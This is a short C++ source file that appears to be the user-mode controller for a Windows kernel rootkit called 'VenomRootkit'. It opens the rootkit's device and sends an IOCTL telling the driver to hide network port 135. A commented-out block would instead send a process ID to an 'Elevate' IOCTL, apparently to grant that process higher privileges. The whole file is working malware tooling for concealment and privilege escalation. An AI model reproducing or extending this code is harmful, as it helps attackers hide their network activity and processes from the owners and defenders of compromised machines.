#include <Windows.h>
#include <iostream>
#include <string>
#include "../VenomRootkit/Ioctl.h"

using namespace std;

#define ERROR_MSG(msg) ::cout << msg << "Error code: " << GetLastError()

int main(int argc, const char* argv[]) {
	//string menu = "Choose: 1";

	auto hDevice = CreateFile(L"\\\\.\\VenomRootkit", GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	if (hDevice == INVALID_HANDLE_VALUE) {
		ERROR_MSG("Invalid handle value");
		return 1;
	}

	/*ULONG PID = 5048;
	std::cout << "The pid is: " << PID;
	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::Elevate, &PID, sizeof(PID), nullptr, 0, &returned, nullptr);*/
	USHORT PORT = 135;
	std::cout << "The port is: " << PORT << endl;
	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HidePort, &PORT, sizeof(PORT), nullptr, 0, &returned, nullptr);
	if (success)
	{
		cout << "YAY" << endl;
	}
	else
	{
		cout << "NAY" << endl;
	}

	CloseHandle(hDevice);

	return 0;

}